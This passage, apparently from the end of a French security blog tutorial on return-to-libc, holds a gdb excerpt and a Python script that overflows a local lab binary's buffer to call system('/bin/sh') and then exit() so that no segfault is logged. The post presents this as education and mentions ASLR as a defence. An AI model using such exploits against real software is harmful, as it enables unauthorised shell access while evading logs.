<span class="o">[</span>Inferior 1 <span class="o">(</span>process 10896<span class="o">)</span> exited normally]
<span class="nt">--------------------------------------------------------------------------</span><span class="o">[</span>regs]
  EAX:Error <span class="k">while </span>running hook_stop:
No registers.
gdb<span class="nv">$ </span>
</code></pre></div></div>

<p>Lorsque nous faisons un exit du premier shell avec notre adresse de retour <code class="highlighter-rouge">"OSEF"</code>, nous avons une faute de segmentation (qui sera loguée, donc qui laisse des traces), tandis qu’en cherchant l’adresse de la fonction <code class="highlighter-rouge">exit()</code>, et en la plaçant en adresse de retour, la sortie du shell que nous avons forké se fait sans erreur, comme le montre le message <strong>exited normally</strong>.</p>

<p>Comme ce n’est pas très lisible, voici un code python qui permet d’exploiter ce binaire avec les éléments que nous avons mis en place</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="c1"># Addresses de system et "/bin/sh"
</span><span class="n">system</span>   <span class="o">=</span> <span class="mh">0xb7ea9e20</span>
<span class="nb">exit</span>     <span class="o">=</span> <span class="mh">0xb7e9d530</span>
<span class="n">bin_sh</span>   <span class="o">=</span> <span class="mh">0xbffff6d2</span>

<span class="c1"># Buffer
</span><span class="n">payload</span>  <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span>

<span class="c1"># Overwrite sEBP (Valeur aleatoire)
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"HNDO"</span>

<span class="c1"># system("bin/sh") avec l'adresse de retour vers exit()
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="nb">exit</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="n">bin_sh</span><span class="p">)</span>

<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"./ret2libc </span><span class="se">\"</span><span class="si">%</span><span class="s">s</span><span class="se">\"</span><span class="s">"</span> <span class="o">%</span> <span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<p>J’espère que cet article aura été utile et clair. Rappelez-vous que ce ne sont que des explications à titre éducatives, pour mieux comprendre votre environnement et les dangers qui existent afin d’en prendre conscience, de les comprendre, et de s’en prémunir.</p>

<p>Pour ouvrir une perspective, sachez que pour les binaires 64bits, les paramètres des fonctions sont passés par les registres (du moins les 6 premiers. S’il y en a plus, ils sont mis sur la pile). Ainsi, il ne faut plus créer une fausse pile pour rendre l’appel valide, mais il faut initialiser les bons registres avec les bonnes valeurs !</p>

<p>Je vous invite également à vous renseigner sur l’<a href="http://fr.wikipedia.org/wiki/Address_space_layout_randomization" target="blank">ASLR</a>, qui est une technique permettant de se prémunir (partiellement) de ces attaques.</p>

  </article>
</div>
<div class="keywords">
    <span class="post-tags"><a href="/archives/#user-land"><i class="fas fa-tags"></i> User Land</a><a href="/archives/#linux"><i class="fas fa-tags"></i> Linux</a></span>
  </div>


<br />
<div class="box">
  <div class="dash">
    <div class="picture">
      <img src="/assets/icones/pixis_logo.png" alt="logo" title="logo" />
    </div>
    <div class="box_content">
      <strong>Auteur</strong> : <a href="/contact/" target="_blank">Pixis</a><br />
      Créateur du blog, suivez-moi sur <a href="https://twitter.com/HackAndDo/" target="_blank">twitter</a> ou <a href="https://discord.gg/9At6SUZ" target="blank">discord</a>
    </div>
    
  </div>
</div>


<div class="related">
  <h2>Articles similaires</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/pass-the-hash/">
            Pass the Hash
            <small>18 Dec 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/remote-lsass-dump-passwords/">
            Extraction des secrets de lsass à distance
            <small>28 Nov 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/bloodhound/">
            BloodHound
            <small>30 Jul 2019</small>
          </a>
        </h3>
      </li>
    
  </ul>
</div>

<div id="disqus_thread"></div>
<script>
    /**
     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */
    
    var disqus_config = function () {
        this.page.url = 'http://localhost:4000/retour-a-la-libc/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = '0000-0000-0000-0008';
    };
    
    (function() {  // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');
        
        s.src = '//hackndo.disqus.com/embed.js';
        
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

        </div>
    </main>
    <script src="/assets/js/jquery-2.1.4.js"></script>
    <script src="/assets/js/jquery.menu-aim.js"></script>
    <script src="/assets/js/anchor.min.js"></script>
    <script src="/assets/js/main.js"></script> <!-- Resource jQuery -->
  </body>
</html>